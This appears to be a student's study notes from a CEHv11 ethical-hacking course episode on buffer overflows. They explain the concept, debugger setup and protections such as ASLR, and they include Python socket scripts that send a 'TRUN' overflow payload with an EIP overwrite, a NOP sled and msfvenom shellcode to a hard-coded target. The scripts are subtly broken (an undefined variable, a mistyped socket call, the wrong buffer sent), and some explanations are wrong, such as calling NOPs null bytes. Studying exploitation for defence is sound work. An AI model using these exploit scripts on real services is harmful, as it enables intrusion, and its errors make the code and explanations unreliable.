    Filename: eccouncil-ceh31250-v11-6-6-1-exploitation-buffer-overflows.md
    Show Name: CEHv11 (312-50)
    Topic Name: System Hacking Phases and Attack Techniques - System Hacking
    Episode Name: Exploitation: Buffer Overflows ================================================================================


#EXAMPLES AT THE BOTTOM
Exploitation: Buffer Overflows
Objectives:

    Summarize the concepts of a Buffer Overflow
    List common tools and techniques used in Buffer Overflow exploit development
    List common protections used to prevent Buffer Overflows

    What is a buffer overflow?
        Improper memory space allocation
        No bounds checking
        Allows data allocated for one memory space to spill over into another
            If this can be controlled, arbitrary code execution can be achieved
    What kind of tools are used to create a buffer overflow?
        
	Network Sniffers
        
	Debuggers
	
	Spike (so we can pick up where we left off)
        
	Programming languages


    Walk us through a simple buffer overflow

#!/usr/bin/env python3

import socket                      # importing the python socket function to open a tcp connection

RHOST = ("192.32.32.3")		# ip address of the remote host or target machine you are sending payload to
RPORT = 8888			# Open port you want to connect over 

BUFF = "A" * 2004		# variable named BUFF that is being filled up with 2004 capitol "A"'s
EIP = b"\xaf\x11\x50\x62"	# "EIP" is a CPU register for the system. and we are feeding a memmory space which he found using a debugger
NOPS = b"\x90" * 16		# "NOPS" are null bites that help ease the machine through register jumps
PAD = b"C" * 625		#  the variabel "PAD" is just filling intself with 625 capitol "C"'s. He is filling in the buffer with padding to make sure the overflow occurrs.

				

#PATTERN = b " ..."


		 He also uses msfvenom to generate a hexidecimal paylaod. Copy and paste of course.
.
.
.
.
PAYLOAD = b"TRUN /.:/" + BUFF + EIP + NOPS + buf + PAD

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))
s.send(PAYLOAD)


#NOTE: The < TRUN /.:/ > command was the command over the network service that was susseptible to the buffer overflow which allowed him to
# send input into the system. This was all done through a command. TRUN /.:/   is the crux to the whole code

----------------------------------------------------------------------------------------------------------------------------------------------
WHAT YOU NEED TO DO TO CREATE BEGIN CREATING A BUFFER OVERFLOW.

1. Download a local copy of the service that is running on the server.( you have to recreate the environment exactly if you want to exploit to work across all machines.)
2. You need to download a debugger to run the service in the identical environment to that of the machine you wish to exploit

# I.E.

1. grab a copy of and OS
2. find a client that allows you to send input. like ssh or ftp or any cient that allows you to send input data into the system 
3. Set it up in the debugger so that it is running the same way as the target machine.


STEPS TO OPEN IT UP

1. Start the instance of your OS you want to play with
2. Fire up immunity (your choice debugger)
3. Select File  - Attach  - look for the service you want to attach to 
4. Select attach and everything should load into the debugger.


    How can we protect against buffer overflows?
        DEP (Data Execution Protection)
        ASLR (Address Space Layout Randomization)
	- this can stop you from making a buffer overflow that works for more then that one computer.
	- The overflow works because we are able to predict where at in the stack the pointer is and where it is going to be.
	- This system makes it so that the stack in every version of that OS is randomized. Which means If the address for this portion
	- of memory was here on this machine and its somewhere else on another. The exploit will only work on the machine it was created on

        Static code analysis
        Safe coding practices



=============================================================================================================================================

# What is a buffer overflow?

If the program is overloaded with data and has NOT been programed on what to do in this situation, we could find ourselves in a crash situation.

What makes buffer overflows encompass so much is in part that the overflow is just one element to the puzzle.
	- What you overflow it with (numbers/character/special characters)
	- When you overflow it (conditional statement)
	- And What your asking it to do upon the overflow. (Leak/execute/write code)
So our goal is to control these elements or even predict them to get the machine to spill/leak code and even execute code for us.
If we can control the elements in a perfect storm we can typically cause a buffer overflow one way or another.

# If I can put my malicious arbitrary code in the over flowed area, the machine is going to execute that memory area next. So 
# that means that I will get my code executed instead of the 'actual' instruction being executed.

	So the idea behind a buffer overflow is that we are overflowing from one memory area into another and controling the execution
	of data in those areas.

So for testing you would fire this off while the program was loaded in the debugger and try locating the overflow.
Dan found out after working with the debugger and testing that the overflow was located at the 2003rd "A"
So this is where we would want to put our malicious code NOPS and PAD. 



#EXAMPLE

#!/usr/bin/env python3

import socket

RHOST = ("10.0.0.1")
RPORT = 9999

BUFF = b"A" * 3000
PAYLOAD = b"TRUN /.:/" + BUFF

s.socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((RHOST, RPORT))
s.send(BUFF)












